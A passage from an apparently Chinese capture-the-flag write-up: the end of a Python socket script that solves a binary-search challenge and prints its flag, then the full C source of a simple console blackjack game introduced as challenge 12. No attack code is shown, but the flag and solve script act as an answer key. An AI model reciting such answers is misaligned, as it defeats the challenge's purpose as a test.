boolean">True</span>     <span class="token keyword">elif</span> <span class="token string">"format error"</span> <span class="token keyword">in</span> data <span class="token operator">or</span> <span class="token string">"time expired"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>.&lt; Bye..."</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">if</span> status<span class="token punctuation">:</span>        data <span class="token operator">=</span> getList<span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[->] send: %s"</span> <span class="token operator">%</span> data<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span></code></pre><pre class=" language-shell"><code class="language-shell">[<-] recv: Congrats! get your flagb1NaRy_S34rch1nG_1s_3asy_p3asy</code></pre><h2 id="12-blackjeck"><a href="#12-blackjeck" class="headerlink" title="12. blackjeck"></a>12. blackjeck</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><p>原地址：<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="noopener">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">// Programmer: Vladislav Shulman</span><span class="token comment" spellcheck="true">// Final Project</span><span class="token comment" spellcheck="true">// Blackjack</span><span class="token comment" spellcheck="true">// Feel free to use any and all parts of this program and claim it as your own work</span><span class="token comment" spellcheck="true">//FINAL DRAFT</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span>                </span><span class="token comment" spellcheck="true">//Used for srand((unsigned) time(NULL)) command</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;process.h></span>             </span><span class="token comment" spellcheck="true">//Used for system("cls") command</span><span class="token macro property">#<span class="token directive keyword">define</span> spade 06                 </span><span class="token comment" spellcheck="true">//Used to print spade symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> club 05                  </span><span class="token comment" spellcheck="true">//Used to print club symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> diamond 04               </span><span class="token comment" spellcheck="true">//Used to print diamond symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> heart 03                 </span><span class="token comment" spellcheck="true">//Used to print heart symbol</span><span class="token macro property">#<span class="token directive keyword">define</span> RESULTS "Blackjack.txt"  </span><span class="token comment" spellcheck="true">//File name is Blackjack</span><span class="token comment" spellcheck="true">//Global Variables</span><span class="token keyword">int</span> k<span class="token punctuation">;</span><span class="token keyword">int</span> l<span class="token punctuation">;</span><span class="token keyword">int</span> d<span class="token punctuation">;</span><span class="token keyword">int</span> won<span class="token punctuation">;</span><span class="token keyword">int</span> loss<span class="token punctuation">;</span><span class="token keyword">int</span> cash <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span><span class="token keyword">int</span> bet<span class="token punctuation">;</span><span class="token keyword">int</span> random_card<span class="token punctuation">;</span><span class="token keyword">int</span> player_total<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> dealer_total<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Function Prototypes</span><span class="token keyword">int</span> <span class="token function">clubcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Displays Club Card Image</span><span class="token keyword">int</span> <span class="token function">diamondcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//Displays Diamond Card Image</span><span class="token keyword">int</span> <span class="token function">heartcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Heart Card Image</span><span class="token keyword">int</span> <span class="token function">spadecard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Displays Spade Card Image</span><span class="token keyword">int</span> <span class="token function">randcard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Generates random card</span><span class="token keyword">int</span> <span class="token function">betting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Asks user amount to bet</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//Asks user to continue</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" menu</span><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Plays game</span><span class="token keyword">void</span> <span class="token function">dealer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//Function to play for dealer AI</span><span class="token keyword">void</span> <span class="token function">stay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">//Function for when user selects 'Stay'</span><span class="token keyword">void</span> <span class="token function">cash_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Test for if user has cash remaining in purse</span><span class="token keyword">void</span> <span class="token function">askover</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//Asks if user wants to continue playing</span><span class="token keyword">void</span> <span class="token function">fileresults</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//Prints results into Blackjack.txt file in program directory</span><span class="token comment" spellcheck="true">//Main Function</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> choice1<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n              222                111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n            222 222            11111                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           222   222          11 111                            "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                222              111                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n               222               111                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c            %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c           %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c          %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c     %c%c          %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c    %c    %c%c         %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                           <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c         %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                             <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c     %c   %c%c        %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n%c%c%c%c%c%c    %c%c%c%c%c%c%c   %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                        21                                   "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c%c%c%c%c%c%c%c      %c%c         %c%c%c%c%c    %c    %c                "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c        %c  %c       %c     %c   %c   %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c    %c     %c          %c  %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                               <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c       %c %c%c %c     %c          %c %c              "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                         <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c %c%c%c%c %c    %c          %c%c %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        %c%c      %c      %c    %c          %c   %c               "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     %c  %c%c     %c        %c    %c     %c   %c    %c             "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c%c%c      %c        %c     %c%c%c%c%c    %c     %c            "</span><span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> diamond<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> heart<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> club<span class="token punctuation">,</span> spade<span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>                                                                                                                                            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n         222                     111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n        222                      111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n       222                       111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      222222222222222      111111111111111                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      2222222222222222    11111111111111111                         "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//end program</span><span class="token keyword">void</span> <span class="token function">asktitle</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Function for asking player if they want to continue</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>    <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                 Are You Ready?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                ----------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n                      (Y/N)\n                        "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"\n%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'y'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>choice1<span class="token operator">!=</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>    <span class="token punctuation">{</span>                                                                                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>choice1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If yes, continue. Prints menu.</span>    <span class="token punctuation">{</span>             <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 1 to Begin the Greatest Game Ever Played."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 2 to See a Complete Listing of Rules."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter 3 to Exit Game. (Not Recommended)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nChoice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// Prompts user for choice</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice2<span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice2<span class="token operator">></span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If invalid choice entered</span>            <span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIncorrect Choice. Please enter 1, 2 or 3\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice2<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>choice2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// Switch case for different choices</span>            <span class="token punctuation">{</span>                   <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to begin game</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to see rules</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cls"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">// Case to exit game</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">default</span><span class="token punctuation">:</span>                   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nInvalid Input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End switch case</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End if loop</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>choice1 <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// If no, exit program</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nYour day could have been perfect."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nHave an almost perfect day!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// End function</span><span class="token keyword">void</span> <span class="token function">rules</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//Prints "Rules of Vlad's Blackjack" list</span><span class="token punctuation">{</span>     <span class="token keyword">char</span> choice1<span class="token punctuation">;</span>     <span class="token keyword">int</span> choice2<span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n           RULES of VLAD's BLACKJACK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n          ---------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nI."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Thou shalt not question the odds of this game."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c This program generates cards at random."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c If you keep losing, you are very unlucky!\n"</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Each card has a value."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Number cards 1 to 10 hold a value of their number."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c J, Q, and K cards hold a value of 10."</span><span class="token punctuation">,</span> diamond<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Ace cards hold a value of 11"</span><span class="token punctuation">,</span> club<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     The goal of this game is to reach a card value total of 21.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nIII."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     After the dealing of the first two cards, YOU must decide whether to HIT or STAY."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n      %c Staying will keep you safe, hitting will add a card."</span><span class="token punctuation">,</span> spade<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     Because you are competing against the dealer, you must beat his hand."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n     BUT BEWARE!."</span><span class="token 